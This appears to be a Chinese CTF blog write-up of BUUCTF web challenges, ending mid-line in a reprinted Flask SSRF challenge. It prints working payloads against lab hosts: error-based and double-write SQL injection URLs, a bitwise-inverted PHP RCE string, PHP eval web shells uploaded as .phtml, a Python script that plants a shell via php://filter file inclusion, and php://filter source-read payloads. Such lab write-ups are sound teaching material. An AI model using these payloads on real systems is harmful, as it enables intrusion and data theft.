<h1 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a>[极客大挑战 2019]LoveSQL</h1><p>报错注入</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="http://0271ebd9-169b-4d78-8475-f6667e20789c.node4.buuoj.cn:81/check.php?username=admin&#39;">http://0271ebd9-169b-4d78-8475-f6667e20789c.node4.buuoj.cn:81/check.php?username=admin&#39;</a> and updatexml(0x7e,concat(0x7e,database()),0x7e) %23&amp;password&#x3D;admin’ and sleep(3)</p>
</blockquote>
<p><img src="/iamges/ji/5.png"></p>
<p>表名:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">geekuser: id,username,password   geek库</span><br><span class="line">l0ve1ysq1: id,username,password  geek库</span><br></pre></td></tr></table></figure>

<p>admin<br>824fc00cd6f8cd94403b365a80bcfbd</p>
<p>cl4y<br>wo_tai_nan_le</p>
<p>glzjin<br>glzjin_wants_a_girlfriend</p>
<p>Z4cHAr7zCr<br>biao_ge_dddd_hm</p>
<p>报错注入，硬爆</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://0271ebd9-169b-4d78-8475-f6667e20789c.node4.buuoj.cn:81/check.php</span><br><span class="line">?username=admin&#x27; and updatexml(1,concat(0x7e,(select substr((select password from l0ve1ysq1 where username=&#x27;flag&#x27;),30,16)),0x7e),1) %23</span><br><span class="line">&amp;password=admin&#x27; and sleep(3)</span><br></pre></td></tr></table></figure>

<h1 id="BJDCTF2020-Easy-MD5"><a href="#BJDCTF2020-Easy-MD5" class="headerlink" title="[BJDCTF2020]Easy MD5"></a>[BJDCTF2020]Easy MD5</h1><p>一眼丁真<code>ffifdyop</code></p>
<p>绕过中一个奇妙的字符串</p>
<p>经过md5加密后：<code>276f722736c95d99e921722cf9ed621c</code></p>
<p>再转换为字符串：<code>&#39;or&#39;6&lt;乱码&gt;  即  &#39;or&#39;66�]��!r,��b</code></p>
<p>用途：</p>
<p><code>select * from admin where password=&#39;&#39;or&#39;6&lt;乱码&gt;&#39;</code></p>
<p><code>就相当于select * from admin where password=&#39;&#39;or 1  实现sql注入</code></p>
<h1 id="极客大挑战-2019-BuyFlag"><a href="#极客大挑战-2019-BuyFlag" class="headerlink" title="[极客大挑战 2019]BuyFlag"></a>[极客大挑战 2019]BuyFlag</h1><p>简单，新手村难度<br>cookie + 传参 +PHP特性</p>
<h1 id="HCTF-2018-admin"><a href="#HCTF-2018-admin" class="headerlink" title="[HCTF 2018]admin"></a>[HCTF 2018]admin</h1><h1 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h1><p>随便点了一个文件，发现了这个传参</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="http://62482047-0242-4246-89d7-23f69a549160.node4.buuoj.cn:81/file?filename=/welcome.txt&amp;filehash=a7b1991d198deda606020048ccd83bee">http://62482047-0242-4246-89d7-23f69a549160.node4.buuoj.cn:81/file?filename=/welcome.txt&amp;filehash=a7b1991d198deda606020048ccd83bee</a></p>
</blockquote>
<p>根据<code>hints.txt</code>发现了<code>md5(cookie_secret+md5(filename))</code></p>
<p><code>cookie_secret</code>这玩意到底是个啥，俺不知道，肯定没法破解</p>
<p>不过阴差阳错访问到了这个</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="http://62482047-0242-4246-89d7-23f69a549160.node4.buuoj.cn:81/error?msg=">http://62482047-0242-4246-89d7-23f69a549160.node4.buuoj.cn:81/error?msg=</a>2</p>
</blockquote>
<p>看样子是python沙箱逃逸了,简单fuzz一下，透心凉，心飞扬</p>
<p>搜索一下，</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="http://62482047-0242-4246-89d7-23f69a549160.node4.buuoj.cn:81/error?msg=">http://62482047-0242-4246-89d7-23f69a549160.node4.buuoj.cn:81/error?msg=</a></p>
</blockquote>
<p><code>&#123;&#39;autoreload&#39;: True, &#39;compiled_template_cache&#39;: False, &#39;cookie_secret&#39;: &#39;6dcbf553-b18a-46ba-9487-8cf74e2c43ca&#39;&#125; </code></p>
<h1 id="ACTF2020-新生赛-Upload"><a href="#ACTF2020-新生赛-Upload" class="headerlink" title="[ACTF2020 新生赛]Upload"></a>[ACTF2020 新生赛]Upload</h1><p>很好看的前端emmm<br>phtm直接梭</p>
<h1 id="极客大挑战-2019-RCE-ME"><a href="#极客大挑战-2019-RCE-ME" class="headerlink" title="[极客大挑战 2019]RCE ME"></a>[极客大挑战 2019]RCE ME</h1><p>典中典之 取反<br><code>?code=(~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%9E%A2%D6%D6);</code></p>
<p>禁用函数，典中典之UAF脚本,蚁剑直接梭</p>
<h1 id="NPUCTF2020-ezinclude"><a href="#NPUCTF2020-ezinclude" class="headerlink" title="[NPUCTF2020]ezinclude"></a>[NPUCTF2020]ezinclude</h1><p>上来题目意义不明？？？？？<br>右键源代码，还没看明白，F12打开控制台看到小饼干，懂了</p>
<p><code>flflflflag.php</code></p>
<p>嗯哼，200状态码的404?</p>
<p>bp抓包，只找到一个文件包含的东西，之后就没有思路了…emm<br>偷偷瞄了一眼达不留屁，<code>dir.php</code>果然是开扫吗？，不过buu没法扫了，就假装我扫到了这个文件吧</p>
<p>尝试暴力尝试了好久，发现并没有什么卵用，Php删的比我访问的要快，很头疼，瞄了一眼，发现是<code>string.strip_tags</code>过滤器让Php崩溃就能留下文件</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://7894069c-9a98-4481-bc25-4a3e267ae86d.node4.buuoj.cn:81/flflflflag.php?file=&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get</span>(<span class="params">st</span>):</span><br><span class="line">    payload = url + st</span><br><span class="line">    r = requests.get(payload)</span><br><span class="line">    <span class="built_in">print</span>(r.ok)</span><br><span class="line">    <span class="comment">#print(type(r.text))</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+ base64decode]\n&quot;</span>,base64.b64decode(r.text[<span class="number">196</span>::][:-<span class="number">38</span>:]).decode())</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+ not encryption]\n&quot;</span>,r.text[<span class="number">196</span>::][:-<span class="number">38</span>:])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">attack</span>():</span><br><span class="line">    file = <span class="string">&quot;&lt;?php eval($_GET[&#x27;cmd&#x27;]);?&gt;&quot;</span></span><br><span class="line">    filedata = &#123;<span class="string">&quot;file&quot;</span>: file&#125;</span><br><span class="line">    payload = url + <span class="string">&quot;php://filter/string.strip_tags/resource=/etc/passwd&quot;</span></span><br><span class="line">    r = requests.post(url=payload,files=filedata)</span><br><span class="line">    <span class="built_in">print</span> (r.ok)</span><br><span class="line">    r2 = requests.get(url=<span class="string">&quot;http://7894069c-9a98-4481-bc25-4a3e267ae86d.node4.buuoj.cn:81/dir.php&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span> (r2.text)</span><br><span class="line"></span><br><span class="line">attack()</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span> :   </span><br><span class="line">     get(<span class="built_in">input</span>(<span class="string">&#x27;&gt;&#x27;</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>绝了，目录里面东找西找，结果flag在phpinfo里<br>flag{6dc36ed0-9300-43fa-bbae-b85d1b9cbd69} </p>
<h1 id="极客大挑战-2019-BabySQL"><a href="#极客大挑战-2019-BabySQL" class="headerlink" title="[极客大挑战 2019]BabySQL"></a>[极客大挑战 2019]BabySQL</h1><p>简单测试一下，双写绕过，简单</p>
<p>数据库名<code>geek</code></p>
<p>整一个快速判断哪里被替换的trick</p>
<p><code>http://99e1704f-301f-41a7-8754-0231317a4c13.node4.buuoj.cn:81/check.php?username=a&amp;password=admin&#39; ununionion seselectlect 1,database(),(seselectlect &quot;union select 1,group_concat(schema_name),3 from information_schema.schemata&quot;) %23</code></p>
<p><img src="/images/ji/6.png"></p>
<p><code>union select 1,group_concat(schema_name),3 from information_schema.schemata</code><br>变成了</p>
<p><code>1,group_concat(schema_name),3 infmation_schema.schemata</code><br>这里<code>or</code>也被替换了，记得双写一下<code>information</code>里面的<code>or</code></p>
<p>所以，需要<code>ununionion seselectlect 1,group_concat(schema_name),3 frfromom infoorrmation_schema.schemata</code></p>
<p>所有库<code>information_schema,mysql,performance_schema,test,ctf,geek</code></p>
<p><code>1,group_concat(table_name),3 infmation_schema.tables table_schema=&#39;geek&#39;</code></p>
<p>表名<code>b4bsql,geekuser</code></p>
<p>字段<code>id,username,password</code></p>
<p>一番查找没找到数据，然后发现数据是在<code>ctf</code>库里的，寄</p>
<h1 id="ACTF2020-新生赛-BackupFile"><a href="#ACTF2020-新生赛-BackupFile" class="headerlink" title="[ACTF2020 新生赛]BackupFile"></a>[ACTF2020 新生赛]BackupFile</h1><p>没啥东西<code>index.php.bak</code>然后源码就一个弱类型判断</p>
<h1 id="极客大挑战-2019-Upload"><a href="#极客大挑战-2019-Upload" class="headerlink" title="[极客大挑战 2019]Upload"></a>[极客大挑战 2019]Upload</h1><p>文件上传，刚传了俩图片，跟我说不是image，有趣</p>
<p>MIME一改，文件名是<code>phtml</code>，内容是<code>&lt;script language=&#39;php&#39;&gt;@eval($_POST[cmd]);&lt;/script&gt;</code> easy</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="http://55facc3d-3d22-4b90-b9c7-f95c9e3f005b.node4.buuoj.cn:81/upload/1.phtml">http://55facc3d-3d22-4b90-b9c7-f95c9e3f005b.node4.buuoj.cn:81/upload/1.phtml</a></p>
</blockquote>
<p>梭</p>
<h1 id="ACTF2020-新生赛-Upload-1"><a href="#ACTF2020-新生赛-Upload-1" class="headerlink" title="[ACTF2020 新生赛]Upload"></a>[ACTF2020 新生赛]Upload</h1><h1 id="MRCTF2020-Ez-bypass"><a href="#MRCTF2020-Ez-bypass" class="headerlink" title="[MRCTF2020]Ez_bypass"></a>[MRCTF2020]Ez_bypass</h1><p>简单，先是md5然后是<code>is_numberic</code>绕过，太简单了</p>
<h1 id="网鼎杯-2020-青龙组-AreUSerialz"><a href="#网鼎杯-2020-青龙组-AreUSerialz" class="headerlink" title="[网鼎杯 2020 青龙组]AreUSerialz"></a>[网鼎杯 2020 青龙组]AreUSerialz</h1><h1 id="网鼎杯-2020-朱雀组-phpweb"><a href="#网鼎杯-2020-朱雀组-phpweb" class="headerlink" title="[网鼎杯 2020 朱雀组]phpweb"></a>[网鼎杯 2020 朱雀组]phpweb</h1><p>file_get_content直接读源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$disable_fun</span> = <span class="keyword">array</span>(<span class="string">&quot;exec&quot;</span>,<span class="string">&quot;shell_exec&quot;</span>,<span class="string">&quot;system&quot;</span>,<span class="string">&quot;passthru&quot;</span>,<span class="string">&quot;proc_open&quot;</span>,<span class="string">&quot;show_source&quot;</span>,<span class="string">&quot;phpinfo&quot;</span>,<span class="string">&quot;popen&quot;</span>,<span class="string">&quot;dl&quot;</span>,<span class="string">&quot;eval&quot;</span>,<span class="string">&quot;proc_terminate&quot;</span>,<span class="string">&quot;touch&quot;</span>,<span class="string">&quot;escapeshellcmd&quot;</span>,<span class="string">&quot;escapeshellarg&quot;</span>,<span class="string">&quot;assert&quot;</span>,<span class="string">&quot;substr_replace&quot;</span>,<span class="string">&quot;call_user_func_array&quot;</span>,<span class="string">&quot;call_user_func&quot;</span>,<span class="string">&quot;array_filter&quot;</span>, <span class="string">&quot;array_walk&quot;</span>,  <span class="string">&quot;array_map&quot;</span>,<span class="string">&quot;registregister_shutdown_function&quot;</span>,<span class="string">&quot;register_tick_function&quot;</span>,<span class="string">&quot;filter_var&quot;</span>, <span class="string">&quot;filter_var_array&quot;</span>, <span class="string">&quot;uasort&quot;</span>, <span class="string">&quot;uksort&quot;</span>, <span class="string">&quot;array_reduce&quot;</span>,<span class="string">&quot;array_walk&quot;</span>, <span class="string">&quot;array_walk_recursive&quot;</span>,<span class="string">&quot;pcntl_exec&quot;</span>,<span class="string">&quot;fopen&quot;</span>,<span class="string">&quot;fwrite&quot;</span>,<span class="string">&quot;file_put_contents&quot;</span>);</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">gettime</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$p</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$result</span> = <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$func</span>, <span class="variable">$p</span>);</span><br><span class="line">        <span class="variable">$a</span>= <span class="title function_ invoke__">gettype</span>(<span class="variable">$result</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$a</span> == <span class="string">&quot;string&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;<span class="keyword">return</span> <span class="string">&quot;&quot;</span>;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$p</span> = <span class="string">&quot;Y-m-d h:i:s a&quot;</span>;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$func</span> = <span class="string">&quot;date&quot;</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;func != <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="title function_ invoke__">gettime</span>(<span class="variable">$this</span>-&gt;func, <span class="variable">$this</span>-&gt;p);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$func</span> = <span class="variable">$_REQUEST</span>[<span class="string">&quot;func&quot;</span>];</span><br><span class="line">    <span class="variable">$p</span> = <span class="variable">$_REQUEST</span>[<span class="string">&quot;p&quot;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$func</span> != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="variable">$func</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$func</span>);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$func</span>,<span class="variable">$disable_fun</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">gettime</span>(<span class="variable">$func</span>, <span class="variable">$p</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Hacker...&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>命名空间绕过数组之后，没有权限写shell，太难受了,不知道flag被藏在了哪里，上bp扫一下吧</p>
<p>flag在<code>/tmp</code>下面<br><code>flag&#123;68a63dcd-6a3a-4a8c-bedb-7c15377fef29&#125;</code></p>
<h1 id="BSidesCF-2020-Had-a-bad-day"><a href="#BSidesCF-2020-Had-a-bad-day" class="headerlink" title="[BSidesCF 2020]Had a bad day"></a>[BSidesCF 2020]Had a bad day</h1><p>以为是sql注入，打了个<code>&#39;</code>后发现是文件包含</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">Warning: include(woofers&#x27;.php): failed to open stream: No such file or directory in /var/www/html/index.php on line 37</span><br><span class="line"></span><br><span class="line">Warning: include(): Failed opening &#x27;woofers&#x27;.php&#x27; for inclusion (include_path=&#x27;.:/usr/local/lib/php&#x27;) in /var/www/html/index.php on line 37</span><br></pre></td></tr></table></figure>

<p>包含<code>index.php</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">			<span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;category&#x27;</span>];</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>))</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">if</span>( <span class="title function_ invoke__">strpos</span>( <span class="variable">$file</span>, <span class="string">&quot;woofers&quot;</span> ) !==  <span class="literal">false</span> || <span class="title function_ invoke__">strpos</span>( <span class="variable">$file</span>, <span class="string">&quot;meowers&quot;</span> ) !==  <span class="literal">false</span> || <span class="title function_ invoke__">strpos</span>( <span class="variable">$file</span>, <span class="string">&quot;index&quot;</span>))&#123;</span><br><span class="line">					<span class="keyword">include</span> (<span class="variable">$file</span> . <span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span>&#123;</span><br><span class="line">					<span class="keyword">echo</span> <span class="string">&quot;Sorry, we currently only support woofers and meowers.&quot;</span>;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>PHP的文件包含,太简单了</p>
<p><code>php://filter/convert.base64-encode/resource=index/../flag</code></p>
<h1 id="BJDCTF2020-Cookie-is-so-stable"><a href="#BJDCTF2020-Cookie-is-so-stable" class="headerlink" title="[BJDCTF2020]Cookie is so stable"></a>[BJDCTF2020]Cookie is so stable</h1><p>用户名写到cookie里面，emm，貌似是ssti?但是过滤很严</p>
<p>留着之后写</p>
<h1 id="强网杯-2019-高明的黑客"><a href="#强网杯-2019-高明的黑客" class="headerlink" title="[强网杯 2019]高明的黑客"></a>[强网杯 2019]高明的黑客</h1><p>上来就送源码,666</p>
<p>我尼玛，几百个文件<br>不会，过，之后做</p>
<h1 id="SSRF-me"><a href="#SSRF-me" class="headerlink" title="SSRF me"></a>SSRF me</h1><p>屎一样的一行代码，我吐了，找个美化后的代码 </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment"># #encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">&#x27;latin1&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">app = Flask(__name__)</span><br><span class="line"> </span><br><span class="line">secert_key = os.urandom(<span class="number">16</span>)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Task</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, action, param, sign, ip</span>):</span><br><span class="line">        self.action = action</span><br><span class="line">        self.param = param</span><br><span class="line">        self.sign = sign</span><br><span class="line">        self.sandbox = md5(ip)</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">not</span> os.path.exists(self.sandbox)):</span><br><span class="line">            os.mkdir(self.sandbox)</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">Exec</span>(<span class="params">self</span>):</span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">        <span class="keyword">if</span> (self.checkSign()):</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;scan&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                tmpfile = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">                resp = scan(self.param)</span><br><span class="line">                <span class="keyword">if</span> (resp == <span class="string">&quot;Connection Timeout&quot;</span>):</span><br><span class="line">                    result[<span class="string">&#x27;data&#x27;</span>] = resp</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span> resp</span><br><span class="line">                    tmpfile.write(resp)</span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;read&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                f = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">                result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = f.read()</span><br><span class="line">            <span class="keyword">if</span> result[<span class="string">&#x27;code&#x27;</span>] == <span class="number">500</span>:</span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = <span class="string">&quot;Action Error&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">            result[<span class="string">&#x27;msg&#x27;</span>] = <span class="string">&quot;Sign Error&quot;</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">checkSign</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">if</span> (getSign(self.action, self.param) == self.sign):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/geneSign&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">geneSign</span>():</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    action = <span class="string">&quot;scan&quot;</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br><span class="line"> </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/De1ta&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge</span>():</span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">&quot;action&quot;</span>))</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">&quot;sign&quot;</span>))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    <span class="keyword">if</span>(waf(param)):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No Hacker!!!!&quot;</span></span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())</span><br><span class="line"> </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(<span class="string">&quot;code.txt&quot;</span>,<span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">scan</span>(<span class="params">param</span>):</span><br><span class="line">    socket.setdefaulttimeout(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.urlopen(param).read()[:<span class="number">50</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Connection Timeout&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getSign</span>(<span class="params">action, param</span>):</span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">md5</span>(<span class="params">content</span>):</span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(content).hexdigest()</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">param</span>):</span><br><span class="line">    check=param.strip().lower()</span><br><span class="line">    <span class="keyword">if</span> check.startswith(<span class="string">&quot;gopher&quot;</span>) <span class="keyword">or</span> check.startswith(<span class="string">&quot;file&quot;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.debug 